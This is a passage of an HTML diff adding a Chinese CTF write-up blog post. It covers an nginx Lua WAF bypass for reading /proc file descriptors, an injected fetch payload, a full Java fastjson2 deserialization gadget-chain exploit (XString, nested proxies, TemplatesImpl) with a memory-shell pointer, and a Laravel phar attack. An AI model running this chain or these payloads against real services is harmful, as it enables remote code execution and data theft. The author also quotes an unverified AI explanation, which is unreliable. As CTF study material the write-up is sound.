class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507231536275.png" alt="image-20250723153556987"></p>
+<h2 id="gateway-advance"><a href="#gateway-advance" class="headerlink" title="gateway_advance"></a>gateway_advance</h2><p>nginx.config</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">worker_processes 1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    use epoll;</span><br><span class="line">    worker_connections 10240;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include mime.types;</span><br><span class="line">    default_type text/html;</span><br><span class="line">    access_log off;</span><br><span class="line">    error_log /dev/null;</span><br><span class="line">    sendfile on;</span><br><span class="line"></span><br><span class="line">    init_by_lua_block &#123;</span><br><span class="line">        f = io.open(&quot;/flag&quot;, &quot;r&quot;)</span><br><span class="line">        f2 = io.open(&quot;/password&quot;, &quot;r&quot;)</span><br><span class="line">        flag = f:read(&quot;*all&quot;)</span><br><span class="line">        password = f2:read(&quot;*all&quot;)</span><br><span class="line">        f:close()</span><br><span class="line">        password = string.gsub(password, &quot;[\n\r]&quot;, &quot;&quot;)</span><br><span class="line">        os.remove(&quot;/flag&quot;)</span><br><span class="line">        os.remove(&quot;/password&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        location / &#123;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                ngx.say(&quot;hello, world!&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /static &#123;</span><br><span class="line">            alias /www/;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                if ngx.var.remote_addr ~= &quot;127.0.0.1&quot; then</span><br><span class="line">                    ngx.exit(403)</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            add_header Accept-Ranges bytes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /download &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                local blacklist = &#123;&quot;%.&quot;, &quot;/&quot;, &quot;;&quot;, &quot;flag&quot;, &quot;proc&quot;&#125;</span><br><span class="line">                local args = ngx.req.get_uri_args()</span><br><span class="line">                for k, v in pairs(args) do</span><br><span class="line">                    for _, b in ipairs(blacklist) do</span><br><span class="line">                        if string.find(v, b) then</span><br><span class="line">                            ngx.exit(403)</span><br><span class="line">                        end</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            add_header Content-Disposition &quot;attachment; filename=download.txt&quot;;</span><br><span class="line">            proxy_pass http://127.0.0.1/static$arg_filename;</span><br><span class="line">            body_filter_by_lua_block &#123;</span><br><span class="line">                local blacklist = &#123;&quot;flag&quot;, &quot;l3hsec&quot;, &quot;l3hctf&quot;, &quot;password&quot;, &quot;secret&quot;, &quot;confidential&quot;&#125;</span><br><span class="line">                for _, b in ipairs(blacklist) do</span><br><span class="line">                    if string.find(ngx.arg[1], b) then</span><br><span class="line">                        ngx.arg[1] = string.rep(&quot;*&quot;, string.len(ngx.arg[1]))</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /read_anywhere &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                if ngx.var.http_x_gateway_password ~= password then</span><br><span class="line">                    ngx.say(&quot;go find the password first!&quot;)</span><br><span class="line">                    ngx.exit(403)</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                local f = io.open(ngx.var.http_x_gateway_filename, &quot;r&quot;)</span><br><span class="line">                if not f then</span><br><span class="line">                    ngx.exit(404)</span><br><span class="line">                end</span><br><span class="line">                local start = tonumber(ngx.var.http_x_gateway_start) or 0</span><br><span class="line">                local length = tonumber(ngx.var.http_x_gateway_length) or 1024</span><br><span class="line">                if length &gt; 1024 * 1024 then</span><br><span class="line">                    length = 1024 * 1024</span><br><span class="line">                end</span><br><span class="line">                f:seek(&quot;set&quot;, start)</span><br><span class="line">                local content = f:read(length)</span><br><span class="line">                f:close()</span><br><span class="line">                ngx.say(content)</span><br><span class="line">                ngx.header[&quot;Content-Type&quot;] = &quot;application/octet-stream&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在配置文件中可以看到flag对应的文件描述符f关闭了(f.close)，但是password的没有关闭。</p>
+<p>在本地试了一下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507251348811.png" alt="image-20250725134803648"></p>
+<p>发现fd6就是f2对应的文件描述符</p>
+<p>又因为lua有个洞，第100个后的参数都会被抛弃<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/71853.html">【技术分享】Nginx Lua WAF通用绕过方法 - SecPulse.COM | 安全脉搏</a></p>
+<p>conf使用的ngx.req.get_uri_args()也受这个漏洞影响，所以第101个参数不会进行黑名单校验</p>
+<p>因为读取的文件的内容也有waf，所以采用分块读取</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507251345876.png" alt="image-20250725134552728"></p>
+<p>拿到password了可以去读内存映射找到delete了的文件</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507251421032.png" alt="image-20250725142150844"></p>
+<p>下面这段话是ai说的，我不知道对不对</p>
+<p>虚拟文件是在 Linux 系统中 <strong>存在于 <code>/proc</code>、<code>/sys</code> 等伪文件系统中的文件</strong>，它们<strong>不占用磁盘空间、没有真实物理文件，只是在内存中按需生成内容</strong>，比如：</p>
+<table>
+<thead>
+<tr>
+<th>虚拟文件路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/proc/self/fd/*</code></td>
+<td>文件描述符的符号链接</td>
+</tr>
+<tr>
+<td><code>/proc/self/maps</code></td>
+<td>显示当前进程内存映射（即进程中各段的地址）</td>
+</tr>
+<tr>
+<td><code>/proc/self/mem</code></td>
+<td>显示当前进程的内存内容（可读写）</td>
+</tr>
+<tr>
+<td><code>/proc/cpuinfo</code></td>
+<td>虚拟展示 CPU 信息</td>
+</tr>
+<tr>
+<td><code>/proc/self/environ</code></td>
+<td>进程的环境变量</td>
+</tr>
+</tbody></table>
+<p><code>/proc/self/mem</code> 是一个<strong>特殊的只允许当前进程按映射范围读取的伪设备文件</strong>，<strong>无法通过 <code>open()</code>+<code>read()</code> 普通方式读取</strong>；</p>
+<p><code>/proc/self/fd/6</code> 则是一个<strong>符号链接</strong>，指向文件描述符编号为 6 所对应的实际文件，<strong>如果这个文件描述符指向的是一个真实存在的文件（哪怕已删除）且权限允许，就能正常读取</strong>；</p>
+<p>虚拟文件 <code>/proc/self/mem</code> 这样的文件有个特点：</p>
+<ul>
+<li>调用 <code>stat()</code> 得到的文件大小为 0；</li>
+<li>对这些文件进行 <code>read()</code> 时，必须指定 <strong>准确的 offset 和长度</strong>；</li>
+<li>否则会返回空内容，或触发错误（比如非法读取区域）；</li>
+<li>有些服务在读取文件前会根据 <code>os.stat(filename).st_size</code> 来判断大小，如果是 0 就直接不读了。</li>
+</ul>
+<p>所以：<br> <strong>很多“普通文件读取”逻辑对 <code>/proc/self/mem</code> 这种需要特殊 offset 的文件无效。</strong></p>
+<p>所以&#x2F;download路由只能读&#x2F;proc&#x2F;self&#x2F;fd但不能读&#x2F;proc&#x2F;self&#x2F;mem</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507251421400.png" alt="image-20250725142102241"></p>
+<h2 id="Tellmewhy"><a href="#Tellmewhy" class="headerlink" title="Tellmewhy"></a>Tellmewhy</h2><p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507121823671.png" alt="image-20250712182306436"></p>
+<p>要进入这个路由首先要过一个filter</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507121823932.png" alt="image-20250712182349827"></p>
+<p>要你请求的host不是127.0.0.1但经过dns解析要为127.0.0.1</p>
+<p>感觉这不是入口点，因为host改变的话就访问不了目标主机了</p>
+<p>入口点</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507131145421.png" alt="image-20250713114530305"></p>
+<p>这里有个注入，payload:name&#x3D;<script>fetch(&quot;<a target="_blank" rel="noopener" href="http://192.168.1.6:8081/baby/why">http://192.168.1.6:8081/baby/why</a>&quot;, {method: &quot;POST&quot;,headers: {&quot;Content-Type&quot;: &quot;application/json&quot;,&quot;X-Real-IP&quot;: &quot;kubernetes.docker.internal&quot; },body: JSON.stringify({&quot;why&quot;: &quot;ZGFzaGluZw==&quot;})});</script>，偶然发现ctx.realIp()取的是host值，ctx.realIp()).getHostAddress()取的是x-real-ip的值(本地可以，远程行不行尚未可知，找完链子再说)</p>
+<p>通过这个就可以进行访问内网ip了，成功调试进</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507131154576.png" alt="image-20250713115437492"></p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>当时做题时就卡在怎么让map.length和jsonobject.length不一致。</p>
+<p>map是solon框架解析到的，jsonobject是由fastjson2解析的(因为JSONObject jsonobject &#x3D; new JSONObject(ctx.body()))</p>
+<p>solon解析不能解析到@type,但是fastjson可以，这里也可以成功绕过了。</p>
+<p>接下来就是找链子</p>
+<p>自定义的反序列化器ban了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">javax.swing.event.EventListenerList</span><br><span class="line">UIDefaults$TextAndMnemonicHashMap</span><br></pre></td></tr></table></figure>
+
+<p>fastjson的JSONObject和JSONArray的toString方法会调用getter,这个黑名单ban的就是HashMap-&gt;JSONObject#toString这条链子,因为这道题的fastjson2版本很高，按理说EventListenerList那条链子是不能到最终的getter的。</p>
+<p>fastjson1&lt;&#x3D;1.2.48，fastjson2&lt;&#x3D;2.0.26在低版本中的利用<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">FastJson与原生反序列化</a></p>
+<p>fastjson1高版本绕过&lt;&#x3D;1.2.83<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化(二)</a></p>
+<p>fastjson2高版本绕过<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q">高版本Fastjson在Java原生反序列化中的利用</a></p>
+<p>wp说tabby跑一下可以发现有条Xstring的链子，但是我发现我的ql数据库里面没有ObjectInputStream，TemplatesImpl这些类，问了ai知道不是所有jdk的类都会弄进数据库里面的，很多就算弄进去了方法这些也是不全的，一般ctf给的jar包打成数据库都不会包含jdk的所有类。因为是jdk8,有tr.jar,直接把rt.jar加进项目的lib中再生成一次数据库。但我怎么打jar包lib都打不进去.能不能来个codeql大神救我一手啊我草</p>
+<p>算了不用codeql了。参考su的wp</p>
+<p>Xstring#equals可以触发其方法参数的toString</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507250911327.png" alt="image-20250725091104203"></p>
+<p>所以可以用两个HashMap分别包裹Xstring实例和JSONObject实例，</p>
+<p>第一次是HashMap#readObject调用putVal,对两个HashMap进行equals</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507250915718.png" alt="image-20250725091528572"></p>
+<p>因为HashMap没有equals，调用其父类AbstractMap#equals</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507250917468.png" alt="image-20250725091728333"></p>
+<p>两个HashMap的value进行equals,只要第一个map的value为Xstring，第二个的value为JSONObject就能成功从HashMap#readObject-&gt;JSONObject#toString</p>
+<p>在低版本的fastjson2中，JSONObject#toString可以调用其某个属性所对应对象的属性的getter,但是高版本fastjson2定义了黑名单，不允许调用特定类的getter.其中就包括了TemplatesImpl.要想绕过，就需要用到动态代理。具体的可以看上文引用了的fastjson2高版本绕过。</p>
+<p>题目直接给出了自定义的代理类<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507250941384.png" alt="image-20250725094120243"></p>
+<p>利用这个代理类代理Template接口(getoutputpropertire是这个接口的方法)就可以成功绕过。</p>
+<p>su的wp（xxxNode.makeGadget()就是返回xxx类型的类的意思)（JSONObject和JSONArray都是实现了InvocationHandler接口的）</p>
+<p>最后嵌套代理：node4是一个JSONArray,node3是MyProxy,node2是JSONObject,node1是TemplateImpl</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Proxy</span> <span class="variable">proxy2</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, (InvocationHandler) node3);</span><br></pre></td></tr></table></figure>
+
+<p>node4构造函数参数为proxy2,proxy2实现了Templates,所以node4调用proxy2时会调用getoutputproperties(),又因为node3#myobject&#x3D;proxy1,所以JSONArray#toString-&gt;proxy2#getoutputproperties-&gt;node3#invoke</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Proxy</span> <span class="variable">proxy1</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectFactory.class, MyObject.class&#125;, (InvocationHandler) node2);</span><br></pre></td></tr></table></figure>
+
+<p>所以node3#invoke-&gt;proxy1#getObject-&gt;node2#invoke（JSONObject#invoke会去其map中查找键名为调用方法所对应字段名，然后return,例如proxy1调用了getObject,JSONObject#invoke查找map中存不存在键名为object的键，map就是传给jsonobject的参数在这里为Node1，若存在就返回。所以成功返回TemplateImpl实例）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> common.Reflections;</span><br><span class="line"><span class="keyword">import</span> common.Util;</span><br><span class="line"><span class="keyword">import</span> gadgets.*;</span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson4_ObjectFactoryDelegatingInvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.setProperty(&quot;properXalan&quot;, &quot;true&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node1</span> <span class="operator">=</span> TemplatesImplNode.makeGadget(cmd);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;object&quot;</span>, node1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node2</span> <span class="operator">=</span> JSONObjectNode.makeGadget(<span class="number">2</span>, map);</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy1</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectFactory.class, MyObject.class&#125;, (InvocationHandler) node2);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node3</span> <span class="operator">=</span> makeGadget(proxy1);</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy2</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, (InvocationHandler) node3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node4</span> <span class="operator">=</span> JsonArrayNode.makeGadget(<span class="number">2</span>, proxy2);</span><br><span class="line"><span class="comment">//       Object node5 = BadAttrValExeNode.makeGadget(node4);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">gadgetChain</span> <span class="operator">=</span> makeXStringToStringTrigger(node4);</span><br><span class="line"></span><br><span class="line">        Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;node1, gadgetChain&#125;;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node6</span> <span class="operator">=</span> HashMapNode.makeGadget(array);</span><br><span class="line">        <span class="keyword">return</span> node6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">makeXStringToStringTrigger</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XString</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> makeMap(o, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, v1);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, v2);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, v2);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, v1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, map1, map1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, map2, map2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fastjson4_ObjectFactoryDelegatingInvocationHandler</span>().getObject(Util.getDefaultTestCmd());</span><br><span class="line">        <span class="type">byte</span>[] serialize = Util.serialize(object);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serialize);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line"><span class="comment">//        Util.runGadgets(object);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(Object gadget)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Reflections.newInstance(<span class="string">&quot;org.example.demo.Utils.MyProxy&quot;</span>,</span><br><span class="line">                MyObject.class, gadget);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>远程不出网，需要找一个solon内存马<a target="_blank" rel="noopener" href="https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84">https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84</a></p>
+<p>最后把内存马放进template即可</p>
+<p>还有一种用SignObject进行二次反序列化的方法。</p>
+<h2 id="gogogo出发喽"><a href="#gogogo出发喽" class="headerlink" title="gogogo出发喽"></a>gogogo出发喽</h2><p>Laravel框架存在漏洞，开启了Debug模式时其lgnition组件会调用file_get_content和file_put_content这是CVE-2021-3129</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14702897.html">Laravel DEBUG模式 反序列化远程代码执行 POP链 - zpchcbd - 博客园</a></p>
+<p>还有一个上传base64后的图片的接口。利用这个接口上传phar,因为只要你用Phar:&#x2F;&#x2F;去读一个文件，并且这个文件的astub部分为a stub<code>是一个文件标志，格式为 ：</code>xxx<?php xxx;__HALT_COMPILER();?>就能成功被解析为phar文件。</p>
+<p>将Laravel框架存在的漏洞放进phar文件中metadata部分。</p>
+<p>对着触发lgnition组件的api发个包</p>
+<p>但是有一点的file_get_content读取phar文件后不一定会立刻反序列化，所以当调用到file_put_content时就会报错，所以要用</p>
+<p>fast destruct<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14104">PHP 反序列化基础完全解析-先知社区</a></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/07/17/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">Tomcat内存马</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/07/07/CakePHP-POP%E9%93%BE/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">CakePHP-POP链</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
